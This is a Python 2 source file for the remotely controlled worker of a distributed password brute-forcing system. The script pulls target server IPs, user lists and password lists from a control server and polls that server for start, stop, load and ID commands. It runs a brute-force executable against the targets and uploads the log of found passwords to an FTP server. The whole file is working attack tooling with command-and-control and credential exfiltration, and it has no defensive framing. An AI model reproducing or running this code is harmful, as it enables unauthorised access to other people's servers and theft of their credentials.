#import importlib
import psutil,subprocess,socket, urllib2, time, ftplib
import sys #, config
global config, has_id

def readlines(sock, recv_buffer=4096, delim='\n'):
    buffer = ''
    data = True
    while data:
        data = sock.recv(recv_buffer)
        buffer += data

        while buffer.find(delim) != -1:
            line, buffer = buffer.split('\n', 1)
            yield line
    return

def getID():
    global config
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((config.ID_server, int(config.ID_port) ))
        s.sendall(config.ID_msg+"\n")
        ID = readlines(s).next() #Stacked here
        ID = ID.split(" ")
        if ID[0] == config.ID_ack:
            config.ID = int(ID[1])
        else:
            print "ERROR : ID server not work, received: ", ID

    except Exception as e:
        print "[ID SERVER ERROR]", e.message
    finally:
        s.close()


def getFromUrl(url):
    return urllib2.urlopen(url).read()

def kill(proc_pid):
    try:
        process = psutil.Process(proc_pid)
        for proc in process.children(recursive=True):
            proc.kill()
        process.kill()
    except Exception as e:
        print "Can't kill process",proc_pid,e


#Will update the founded passwords file
def ftpConnectAndWritte(file_name):
    global config
    #lock.acquire()
    try:
        ftp = ftplib.FTP(config.ftp_ip)
        if config.ftp_user != "":
            ftp.login(config.ftp_user, config.ftp_pass)
        else:
            ftp.login()
        ftp.cwd(config.ftp_dir)
        with open(file_name,'rb') as f:
            ftp.storbinary('STOR '+str(config.ID)+"_"+file_name, f)
    finally:
        try:
            ftp.quit()
        except:
            pass
        #lock.release()

def parseConfig():
    global config
    class Config(object):
        pass
    config = Config()
    try:
        with open("./config.py","r") as CR:
            L = CR.readlines()
            LL = filter(lambda x : x != "\n" and x[0] != "#", L)
            LLL = map(lambda x : x.split("#")[0].split("\n")[0] , LL)
            LLL = map(lambda x: x[:-1] if x[-1] == "\r" else x , LLL)
            DL = dict([[l.split("=")[0],
                        ("=".join(l.split("=")[1:])).split("\"")[1] if "\"" in ("=".join(l.split("=")[1:])) else ("=".join(l.split("=")[1:]))] for
                       l in LLL])
            config.__dict__ = DL
            #print config.__dict__
            #sys.stdout.flush()
    except Exception as e:
        print "[ERROR] Configurations parese incorrect"
        return False
    return True

def getServersInformation():
    global config
    try:
        s_ips = getFromUrl(config.server + "/" + config.server_ips)
        with open(config.server_ips, "w") as WF:
            v = s_ips.split("\n")
            for s in xrange(len(v)):
                if len(v) != (s + 1): WF.write(v[s].split("\r")[0] + "\n")
                else: WF.write(v[s].split("\r")[0])
        s_paswords = getFromUrl(config.server + "/" + config.server_pass)
        with open(config.server_pass, "w") as WF:
            v = s_paswords.split("\n")
            for s in xrange(len(v)):
                if len(v) != (s + 1):
                    WF.write(v[s].split("\r")[0] + "\n")
                else:
                    WF.write(v[s].split("\r")[0])
        s_users = getFromUrl(config.server + "/" + config.server_user)
        with open(config.server_user, "w") as WF:
            v = s_users.split("\n")
            for s in xrange(len(v)):
                if len(v) != (s + 1):
                    WF.write(v[s].split("\r")[0] + "\n")
                else:
                    WF.write(v[s].split("\r")[0])
        s_config = getFromUrl(config.server + "/" + config.server_configurations)
        with open(config.server_configurations, "w") as WF:
            v = s_config.split("\n")
            for s in xrange(len(v)):
                if len(v) != (s + 1):
                    WF.write(v[s].split("\r")[0] + "\n")
                else:
                    WF.write(v[s].split("\r")[0])
    except Exception as e:
        print "[SERVER] Error during server connection : ", str(e)
        return False
    return True

def getNumIds():
    global config
    try:
        s_id = getFromUrl(config.server + "/" + config.server_id).split("\n")
        #print s_id
        if s_id[-1] != "":
            s_id = int(s_id[-1])
        else:
            s_id = int(s_id[-2])
    except Exception as e:
        print "[SERVER] Error during server connection : ", str(e)
        return -1
    return s_id

def controlFromServer():
    global config, has_id
    #proc = subprocess.Popen([config.exe_brute,config.ID])
    state = "none"
    N = 0
    while True:
        try:
            control = getFromUrl(config.server + "/" + config.server_control).split("\n")[0]
            print control
            if control == "log":
               print "Sending the log"
               ftpConnectAndWritte("brute.log")
            elif state != control:
                state = control
                if state == "start":

                    if has_id:
                        N = getNumIds()
                        proc = subprocess.Popen([config.exe_brute, str(config.ID), str(N)])
                        print "Started proces ",proc.pid,control
                    else:
                        print "Take and ID, wrong ID currently"
                elif state == "stop": #Just to avoid errors
                    print "Killing proces... ", proc.pid
                    try:
                        kill(proc.pid)
                    except Exception as e:
                        print "ERROR KILLING PROCESS ", e, proc.pid
                    print "Killed proces ", proc.pid
                elif state == "load":  # Just to avoid errors
                    print "Loading resources from ", config.server
                    getServersInformation()
                    parseConfig()
                elif state == "id":  # Just to avoid errors
                    print "Getting id.."
                    getID()
                    if int(config.ID) < 0:
                        print "Error retriving the ID"
                        has_id = False
                    else:
                        has_id = True
                    print "Get ",config.ID
            sys.stdout.flush()
            time.sleep(float(config.control_updateTime))
        except Exception as e:
            print "Error geting from url",e

if __name__ == "__main__":
    #config = importlib.import_module("config")
    if not parseConfig():
        print "Error parsing configurations"
        sys.exit(3)
    getID()
    if int(config.ID) < 0:
        print "Error retriving the ID"
        has_id=False
    else:
        has_id=True
    #if not getServersInformation():
    #    print "Error retriving servers files"
    #    sys.exit(2)
    controlFromServer()
    sys.exit(0)